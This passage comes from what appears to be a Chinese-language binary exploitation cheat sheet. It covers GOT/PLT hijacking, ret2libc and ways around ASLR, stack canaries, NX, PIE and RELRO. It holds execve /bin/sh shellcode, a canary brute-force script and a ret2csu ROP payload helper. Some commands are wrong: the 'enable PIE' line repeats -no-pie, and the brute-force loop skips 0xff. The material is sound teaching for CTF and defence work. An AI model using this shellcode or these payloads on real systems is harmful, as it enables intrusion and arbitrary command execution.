0x08               ;left shift to trim off the two bytes of padding    </span><br><span class="line">shr rcx, 0x08               ;ringht shift to re order string</span><br><span class="line">push rcx                    ;push the immediate value stored in rcx onto the stack</span><br><span class="line">lea rdi, [rsp]              ;load the address of the string that is on the stack into rsi</span><br><span class="line">xor rdx, rdx                ;zero out rdx for an execve argument</span><br><span class="line">mov al, 0x3b                ;move 0x3b (execve sycall) into al to avoid nulls</span><br><span class="line">syscall                     ;make the syscall</span><br></pre></td></tr></table></figure></li><li><p>execve（x86-64，31 bytes）</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; &quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">xor rdi, rdi</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rax, rax</span><br><span class="line">push rax</span><br><span class="line">; 68 73 2f 2f 6e 69 62 2f</span><br><span class="line">mov rbx, 68732f2f6e69622fH</span><br><span class="line">push rbx</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li></ol><h1 id="Libc"><a href="#Libc" class="headerlink" title="Libc"></a>Libc</h1><p>Getshell 的方式之一。libc 是 Linux 下的一组标准函数库，包含了 C 语言最基本的函数。当程序采用动态链接时，在加载程序的时候会将指定的 libc 链接到程序，若未指定则使用操作系统当前的 libc，这样程序中才可以调用 libc 中提供的外部函数。当操作系统为程序加载完成 libc 以后，程序中需要调用的外部函数就会被放在内存中，libc 中的每个函数地址都是一个偏移量，程序加载 libc 以后确定了 libc 的基地址，再加上 libc 中函数的偏移量就可以得到 libc 中函数在内存中的真实地址，当程序调用 libc 中的外部函数时，会通过 plt 表与 got 表跳转到该函数。</p><ul><li><p>PLT 表(Procedure Linkage Table, 程序链接表，.plt 段)<br>  用来存储程序中使用的外部函数的入口，也就是 got 表中对应的条目。位于代码段，编译时确定，没有写权限，无法修改。plt 表中第一项的作用就是跳转到_dl_runtime_resolve 函数，函数原型为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，该函数可以动态解析函数地址并且写入到 got 表中，最后还会调用被解析的函数。该条目一般由两条指令构成，第一条指令是 push 一个值到栈中，该值为_dl_runtime_resolve 的第一个参数 link_map_obj，也就是 got 表中的第一项，第二条指令是跳转到_dl_runtime_resolve 函数的地址，调用该函数，也就是 got 表中的第二项。其余 plt 表项一般由 3 条指令构成，第一条指令跳转到对应的 got 表条目中存储的地址，第二条指令是 push 一个值到栈中，该值就是_dl_runtime_resolve 的第二个参数 reloc_index，第三条指令就是跳转到 plt 表的第一项，也就是调用动态链接器解析函数地址。plt 表的结构如下所示。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">plt[0]:</span><br><span class="line">    push got[1]</span><br><span class="line">    jmp got[2]</span><br><span class="line">func@plt:</span><br><span class="line">    jmp func@got</span><br><span class="line">    push func_index</span><br><span class="line">    jmp plt[0]</span><br><span class="line">otherfunc@plt:</span><br><span class="line">    jmp otherfunc@got</span><br><span class="line">    push otherfunc_index</span><br><span class="line">    jmp plt[0]</span><br><span class="line">anotherfunc@plt:</span><br><span class="line">    jmp anotherfunc@got</span><br><span class="line">    push anotherfunc_index</span><br><span class="line">    jmp plt[0]</span><br></pre></td></tr></table></figure></li><li><p>GOT 表 (Global Offset Table, 全局偏移表，.got.plt 段)<br>  用来存储外部函数在内存中的地址，plt 表与 got 表中的条目是一一对应的。位于数据段，可以动态修改，具有写权限。got 表就是一个函数指针数组，其中 got 表的第一项 got[0] 是程序动态段 (.dynamic) 的装载地址，该段中保存了所有程序中需要使用的外部函数，got 表的第二项 got[1]是 link_map_object 的地址，也就是_dl_runtime_resolve 的第一个参数，got 表第三项 got[2]是_dl_runtime_resolve 函数的地址，其余条目为外部函数的地址，与 plt 表相对应，plt 表与 got 表都对应关系如下所示。</p>  <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">           got[0] ---&gt; .dynamic address</span><br><span class="line">       |-&gt; got[1] ---&gt; link_map_object address</span><br><span class="line">plt[0] --&gt; got[2] ---&gt; _dl_runtime_resolve address</span><br><span class="line"></span><br><span class="line">plt[1] --&gt; got[3]</span><br><span class="line">plt[2] --&gt; got[4]</span><br><span class="line">plt[3] --&gt; got[5]</span><br><span class="line">...        ...</span><br></pre></td></tr></table></figure></li></ul><p>当程序使用动态链接时，采用一种被称为延迟绑定的技术以提高程序执行效率。虽然 got 表的作用是存储所有外部函数的地址，但是当程序刚开始运行时初始 got 表中所有的条目都指向 plt 表中对应的条目（即对应 plt 条目中的第二条指令 push），而 plt 表中对应条目的作用除了跳转到 got 表中对应条目存储的地址，另外就是解析并且绑定该外部函数的地址，也就是说当程序第一次调用某个外部函数时，该函数的地址才会被解析并且写入到 got 表中，以后每次调用都会直接通过 got 表跳转到对应地址而不用重新解析地址。调用外部函数的过程如下所示。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/7.png"></p><ol><li>首先程序中第一次调用外部函数 func，跳转到 func@plt 中</li><li>执行 func@plt 表中第一条指令，跳转到 func@got</li><li>由于这是第一次调用 func，所以 func@got 表中存储的是 func@plt 中的第二条指令地址，也就是 func@plt+6</li><li>跳转到 plt[0]准备执行_dl_runtime_resolve</li><li>执行_dl_runtime_resolve，并且修改对应的 func@got 表条目地址为真正的 func 地址，并且跳转到 func 函数的地址执行</li><li>第二次调用 func 函数，跳转到 func@plt 中</li><li>func@plt 再跳转到 func@got 中</li><li>由于 func@got 已经被修改为 func 的真正地址，所以就可以直接跳转到 func 函数的地址执行，并且以后调用 func 函数时都可以直接执行，无需重新解析地址</li></ol><p>针对 libc 的利用主要是通过修改 got 表中的条目来控制执行流程，称为 got 表劫持（当然如果程序中有 libc 中的 system 函数调用就可以直接跳转到 system@plt，不过一般很少出现这种情况）。前面已经知道 got 表就是一个函数指针数组，并且可写，所以只想办法获取 system 函数在加载到程序中的 libc 中的地址，就可以修改 got 表中某个函数的地址为 system 函数的地址，例如修改 puts 函数的地址，修改完成后以后每次调用 puts 都相当于调用 system 函数。</p><p>由于 got 表中只存储了程序中使用到的外部函数的地址，所以没有办法直接获取到 system 函数地址，但是如果知道程序使用的 libc，就可以知道 system 函数在 libc 中的地址偏移，之后再从程序中想办法拿到 libc 的基地址，两者相加就可以知道 system 函数在程序中的真实地址。</p><p>一般的套路是想办法从程序中泄漏出一个 libc 库函数中某个函数的地址，例如 puts 函数。拿到 puts 函数的地址以后，由于 libc 的基地址低 12 位（低 3 个十六进制数）都是 0，所以只需要函数地址的低 12 位（3 个十六进制数）就可以通过偏移确定出程序使用 libc 版本，拿到 libc 以后就可以知道 system 函数与 puts 函数在 libc 中的偏移，计算出 system 函数地址的公式为 <code>system 地址 = puts 地址 - pus 偏移 + system 偏移</code>，其中<code>puts 地址 -puts 偏移</code> 计算出的就是 libc 的基地址。计算出 system 的地址以后就可以通过其他方式修改 got 表中其他函数的地址，实现 got 表劫持，此外 libc 中一般都自带了字符串<code>/bin/sh</code>，只需要知道该字符串在 libc 中的偏移地址就无需自己构造该字符串。</p><p>需要注意的是 libc 中除了 system 还有一个函数 execve 也可以执行命令，由于 system 函数中可能会对内存对齐进行检查，导致执行失败，所以当使用 system 函数执行失败后可以在 system 函数之前的参数添加 buf 使内存对齐，或者改用 execve 函数。</p><p>此外，在没有开启 PIE 的情况下，got 表的基地址是固定的，因此通过 IDA 获取 got 表中某条目的地址以后，修改该地址就可以劫持控制流，由于对应的 plt 表第一条指令就是 jmp 到 got 表对应条目中存储的地址，通过修改 got 表中的地址就可以直接劫持控制流，jmp 到需要的地址，这是一种很常见的劫持控制流的方法。</p><p>为了方便我们写入<code>/bin/sh</code>，可以直接修改 got 表上的部分函数为 system，例如<code>strlen(user_input),strcmp(user_input,xx),strncmp(user_input,xx),memcmp(user_input,xx),atoi(user_input),free(user_input)</code>，这些函数都可以直接接收用户输入作为参数，修改为 system 就可以。</p><h1 id="Protection-Bypass"><a href="#Protection-Bypass" class="headerlink" title="Protection Bypass"></a>Protection Bypass</h1><ul><li><p>ASLR（Address Space Layout Randomization，地址空间布局随机化）</p><p>  一种由操作系统提供的保护机制，将部分内存基地址随机化使攻击者无法预测地址。大部分操作系统都默认开启 ASLR。ASLR 主要有 3 个级别：</p><ul><li><p>0 — 关闭 ASLR，每次加载程序的堆栈，libc 等地址均相同</p></li><li><p>1 — 开启 ASLR，主要影响 mmap 基地址，栈基地址，libc 基地址</p></li><li><p>2 — 开启强化 ASLE，在 1 级别的基础上增加了堆随机化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置 ASLR，注意在 Docker 中无法关闭 ASLR</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt;/proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">echo</span> 2 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Canary（金丝雀）</p><p>  以前的矿工下矿之前为了检查矿井内是否有有毒气体，通常会将一只金丝雀送进去，如果金丝雀死了，就代表矿洞内有有毒气体（也有版本说是盗墓者盗墓会用金丝雀判断墓穴内是否有有毒气体）。Canary 是一种防止栈溢出的保护机制，其原理为在程序的入口处首先从 fs/gs 寄存器偏移 0x28 处取出 4 或 8 个字节（取决于操作系统位数）压入栈中，之后在开辟其他局部变量栈帧，当函数执行结束以后再检查该值是否与之前相同，若相同则正常退出函数，否则检测到发生栈溢出，调用 <code>__stack_chk_fail</code> 函数强制终止程序运行。为了避免 canary 被其上方的局部变量一起打印输出，canary 通常以 0x00 结尾以截断 canary 上面局部变量的字符串。编译器通常默认不开启 canary 保护。Canary 在栈中结构如下所示。</p><p>  <img src="/2021/08/14/StackOverflow-CheatSheet/8.png"></p><p>  <code>__stack_chk_fail</code>函数原型如下</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 canary</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 canary，但是只会为局部变量中含有 char 数组的函数开启</span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 为所有函数开启 canary</span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li><li><p>NX（No Execute，堆栈不可执行）</p><p>  将堆栈内存页标记为不可执行，当控制流程转入堆栈上以后，CPU 若尝试在堆栈上执行指令时就会引发异常。编译器通常默认开启 NX。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 NX</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 NX</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li><li><p>PIE（Position Independent Executable，地址无关代码）</p><p>  基于 ASLR 的代码段与数据段地址随机化技术，需要编译器将程序编译成位置无关，并链接为 ELF 共享对象，程序每次加载到内存中以后代码地址与数据地址均不同，主要影响代码段 (.text)，数据段(.data) 与全局数据段(.bss)。注意只有开启了 ASLR，PIE 才会生效，编译器通常默认开启 PIE。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 PIE</span></span><br><span class="line">gcc -no-pie -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 PIE</span></span><br><span class="line">gcc -no-pie -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li><li><p>RELRO（Read Only Relocation，重定向只读）</p><p>  将经过动态链接器处理过后的内存区域设置为只读权限以避免 got 表劫持这类攻击方式。RELRO 通常有两种：</p><ul><li><p>Partial RELRO</p><p>影响部分通过动态链接器处理的内存段 (.init_array .fini_array .jcr .dynamic .got) 并且设置为只读，但是 got 表 (.got.plt) 还是可写的</p></li><li><p>Full RELRO</p><p>Partial RELRO 的基础上经用了延迟绑定，got 表中所有条目在程序刚加载 libc 的时候全部解析完成，并且将 got 表设置为只读。</p><p>编译器通常默认开启 Partial RELRO。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 Partial RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启 Full RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="Common-Bypass"><a href="#Common-Bypass" class="headerlink" title="Common Bypass"></a>Common Bypass</h2><ol><li><p>ret2text</p><p> 修改返回地址到程序中已经存在的代码处，例如有些程序中可能提供了执行系统命令的方法。</p></li><li><p>ret2syscall</p><p> 如 0x5 节中所提到的，通过 ROP 构造系统调用 execve 执行命令。</p></li><li><p>ret2shellcode</p><p> 如 0x6 节中所提到的，通过将 shellcode 写入某处具有可执行权限的内存并且执行 shellcode，shellcode 通常也是一段进行系统调用的二进制代码。</p></li><li><p>ret2libc</p><p> 如 libc 节中所提到的，通过程序中泄漏的 libc 地址来获取 system 函数在 libc 中的真实地址，从而跳转到 libc 中的 system 函数执行命令。</p></li></ol><h2 id="Bypass-ASLR"><a href="#Bypass-ASLR" class="headerlink" title="Bypass ASLR"></a>Bypass ASLR</h2><p>ASLR 是最常见的保护措施，有很多种基础的方法可以绕过，大部分方法在前文中均介绍过。</p><ol><li><p>nop 垫</p><p> 若没有开启 NX（比较少见），则可以将 shellcode 写入栈上，但是由于无法确定 shellcode 准确的地址，因此可以在 shellcode 前面填充大量的 nop 指令（0x90，也称为 nop 垫，该指令什么也不做），跳转的时候可以跳转到一个大致的范围，只要命中了一个 nop 垫，就可以一直滑行到 shellcode，nop 垫填充的越多，命中的概率越大。</p></li><li><p>泄漏 libc 基地址</p><p> 最常用的办法，如 libc 节中所讲， 先泄漏出 libc 中某个函数的地址以后再计算出其他函数的地址，此类攻击方法要求程序必须一次执行可以多次输入输出。</p></li><li><p>爆破 libc 基地址</p><p> 由于 libc 基地址的随机化只会影响一个字节也就是 8 位，所以最多只需要爆破 256 次就可以爆破出正确的 libc 基地址。libc 基地址的最后 12 位（3 个十六进制数）都是 0，从倒数第 20 位到倒数第 12 位这 8 位每次都会改变，其余位不变，例如 0xf7fxx000，其中 xx 为每次改变的字节。该攻击方法需要提前知道 libc 版本。</p></li><li><p>修改 got 表</p><p> 比较常用的办法。如 libc 节中修改 got 表的方法，可以将 got 表项修改为某个 libc 函数地址，如果没有开启 PIE，也可以修改为 ROP 链的起始地址。</p></li><li><p>ROP 链</p><p> 也是非常常用的办法，如果没有开启 PIE 则可以直接构造 ROP 链。</p></li></ol><h2 id="Bypass-Canary"><a href="#Bypass-Canary" class="headerlink" title="Bypass Canary"></a>Bypass Canary</h2><p>比较令人烦恼的保护措施，canary 主要为了防止栈溢出，并且 canary 最后一个字节为 0x00。</p><ol><li><p>泄漏 canary</p><p> 最常用的方法。为了避免 canary 被其他局部变量附带输出，所以 canary 通常以 0x00 结尾以截断 canary 上面的局部变量，因此可以通过栈溢出覆盖掉 canary 最后的 0x00，使其可以被附带输出，即可泄漏 canary，拿到 canary 以后溢出的时候将 canary 填写到对应的位置即可绕过。</p></li><li><p>爆破 canary</p><p> 程序每次启动后 canary 是不同的，但是对于同一个进程，由于子进程会拷贝父进程的内存，子线程与父线程共用内存，所以一个程序的子进程和子线程的 canary 都是相同的，因此如果程序可以多次 fork 子进程或者启动子线程，那么就可以在子进程或子线程中爆破 canary。</p><p> 对于爆破过程，采用逐字节爆破是最高效的，每次爆破最低的一个字节（8 位，16*16=256 次），从 0x00 到 0xff，并且 canary 的结尾必是<code>\x00</code>，因此 32 位只需要爆破 3 个字节（256*3=768 次），64 位只需要爆破 7 个字节（256*7=1792 次）。</p><p> 爆破 canary 的脚本如下</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">start = <span class="built_in">len</span>(p)</span><br><span class="line">stop = <span class="built_in">len</span>(p) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(p) &lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">      ret = send_and_recv(p + <span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ret:</span><br><span class="line">         canary += <span class="built_in">chr</span>(i)</span><br><span class="line">         <span class="built_in">print</span> <span class="string">&quot;[+] Find 0x%02x&quot;</span> % i</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="built_in">print</span> <span class="string">&quot;[-] Brute failed&quot;</span></span><br><span class="line">         sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = canary[stop:start-<span class="number">1</span>:-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Got canary: 0x%s&quot;</span> % canary</span><br></pre></td></tr></table></figure></li><li><p>劫持<code>__stack_chk_fail</code></p><p> 该函数在 canary 对比失败以后会被调用，该函数会强制终止程序。该函数属于 libc，因此函数地址在 got 表中，通过劫持 got 表可以修改该函数从而使程序不会被终止。此外由于该函数在终止前还会打印出 argv[0]的内容（也就是程序名），因此如果可以获取到 argv 在 libc 中的地址，并且修改 argv，就可以通过该函数打印出需要的数据。</p></li><li><p>修改 canary</p><p> 在前文中提到过，函数中的 canary 是从 fs/gs 寄存器偏移 0x28 处取出 4 或 8 个字节，实际上 fs/gs 寄存器偏移 0x28 处是 TLS(thread local storage，线程局部存储)中的 stack_guard 值，因此如果可以修改 TLS 中的 stack_guard 就可以修改 canary。</p></li></ol><h2 id="Bypass-NX"><a href="#Bypass-NX" class="headerlink" title="Bypass NX"></a>Bypass NX</h2><p>NX 为了防止堆栈上的 shellcode，也很常见。开启 NX 以后就不能直接把 shellcode 写入堆栈上，但是可以想办法找到其他具有可执行权限的段去写，不过 Bypass NX 最常用的方法就是 ROP，使用 ROP 只需要把 ROP 链的各个地址与参数压入栈中，最终跳转到 shellcode 地址或者构造系统调用，ROP 的执行过程还是在代码段中。或者可以如 libc 中所介绍的攻击方法，总之开启了 NX 就代表堆栈上无法执行任何代码。</p><h2 id="Bypass-PIE"><a href="#Bypass-PIE" class="headerlink" title="Bypass PIE"></a>Bypass PIE</h2><p>最麻烦的保护措施，通过将代码段，数据段，全局变量段等进行地址随机化，使得常用的 ROP 技术失效（制作 ROP 链需要知道 gadgets 的地址）。程序中每一条指令的地址都作为一个偏移，在程序执行的过程中指令的真实地址就是程序运行时的基地址加上该指令偏移地址就可以得到真实地址。由于每次程序执行代码地址都会变，因此不方便下断点调试，可以在 gdb 中先用 vmmap 查看程序基地址，再加上偏移地址就可以得到真实地址。</p><ol><li><p>partial write</p><p> 最常用的绕过方式，开启了 PIE 后虽然基地址每次都会改变，但是低 12 位 (3 个十六进制数) 是不变的，因此通过改写后 12 位地址就控制一部分范围的偏移跳转，若目标地址刚好位于修改第 12 位就可以跳转的范围内，就可以通过 partial write 绕过 PIE</p></li><li><p>泄漏地址</p><p>开启 PIE 的程序每条指令都采用相对偏移地址，很类似 libc 节中 libc 函数的情况 ，每条指令的偏移是可以事先得知的，因此只要能够在程序运行的过程中泄漏出任何一个指令的真实地址，那么就可以计算出程序的基地址，这样其他指令的地址就可以得知了，类似 libc 节中泄漏 libc 基地址计算 system 的地址。</p></li><li><p>vsyscall</p><p> 为了加快程序执行系统调用的速度，部分 linux 内核将部分无参数的系统调用从内核空间映射到用户空间里，这些被映射的系统调用被称为 vsyscall。程序就算开启了 PIE，但是 vsyscall 的地址是不变的，所以 vsyscall 中调用 syscall 指令的地址也是一直不变的，这样我们就有了一个 <code>syscall</code> 的 gadget。需要注意的是直接 rop 跳到 vsyscall 里的 <code>syscall</code> 会段错误，因为 vsyscall 会检查是否是从该系统调用的开头开始执行的（例如 syscall 的地址是 0xffffffffff600007，而该系统调用函数的开头是 0xffffffffff600000，所以我们只能先跳转到 0xffffffffff600000）。此外，现在的部分操作系统已经删除了 vsyscall 功能。</p></li><li><p>vdso</p><p> vdso 是为了取代 vsyscall 而存在的，功能和 vsyscall 一样，由 glibc 提供，因此 vdso 中的地址是随机化的，不过好处是 vdso 中的任意一条指令都可以执行，不像 vsyscall 还会检查是否是从开头执行。那么如果要利用 vdso，就需要爆破出 vdso 中的指令地址，在 64 位下 vdso 的地址随机化达到 22 位，而 32 位仅有 16 位（一个字节）是随机的，比较容易爆破，</p></li></ol><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>此攻击方式是 <a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf">BlackHat2018</a> 中提出来的，可以看做是 rop 的万金油，其作用就是在利用__libc_csu_init 函数中提供的通用 gadgets 来实现调用任意参数小于等于 3 个的函数。__libc_csu_init 位于程序中，其作用就是初始化 libc，所以此攻击的前提就是程序需要调用 libc。在__libc_csu_init 中一共有两段可用的 gadgets，如下所示（这里提供的 64 位示例来自 CTF Wiki，不同的 libc 版本该函数的内容可能不太一样，但是总体上是差不多的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">; Second gadgets.</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">; First gadgets.</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure><p>第一段 gadgets 从 0x40061A 开始（即 pop rbx）可以利用栈上的值控制寄存器 rbx，rbp，r12，r13，r14，r15，第二段 gadgets 从 0x400600 开始（即 mov rdx, r13），可以通过 r13，r14 与 r15 控制函数的前三个参数 rdx，rsi 与 rdi（只能控制低 32 位 4 个字节，高 32 位为 0），而之后紧接着就有一个 call，通过 r12 与 rbx 就可以构造出目标函数的地址。call 指令结束以后后面三条指令的目的就是需要满足 rbp==rbx+1，如果满足该关系式程序逻辑就不会进行跳转，而是继续执行后面的指令。</p><p>攻击前提：</p><ol><li>64 位程序</li><li>使用了 libc</li><li>没有开启 PIE</li></ol><p>由于可控制的函数的第一个参数只能控制 4 个字节，因此 system 函数这一类的就用不了，但是可以利用 read 或者 write 函数读写地址。利用的 exp 如下（不同版本可能寄存器不太一样）。其中 gadgets1 和 gadgets2 对应的就是上面的 First gadgets 和 Second gadgets。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu64</span>(<span class="params">gadgets1, gadgets2, func_addr, arg0, arg1, arg2</span>):</span><br><span class="line">    rbx, rbp = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    r12 = func_addr</span><br><span class="line">    r13 = arg2  <span class="comment"># rdx</span></span><br><span class="line">    r14 = arg1  <span class="comment"># rsi</span></span><br><span class="line">    r15 = arg0  <span class="comment"># rdi, only low 32bits available.</span></span><br><span class="line">    <span class="keyword">return</span> p64(gadgets1) + \</span><br><span class="line">        p64(rbx) + p64(rbp) + \</span><br><span class="line">        p64(r12) + p64(r13) + \</span><br><span class="line">        p64(r14) + p64(r15) + \</span><br><span class="line">        p64(gadgets2)</span><br><span class="line"></span><br><span class="line">conn.send(junkdata + ret2csu(...))</span><br></pre></td></tr></table></figure><p>32 位的 gadget 如下所示，由于 32 位主要通过栈传递参数，因此利用范围比 64 位小很多。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:080487D8 loc_80487D8:                            ; CODE XREF: 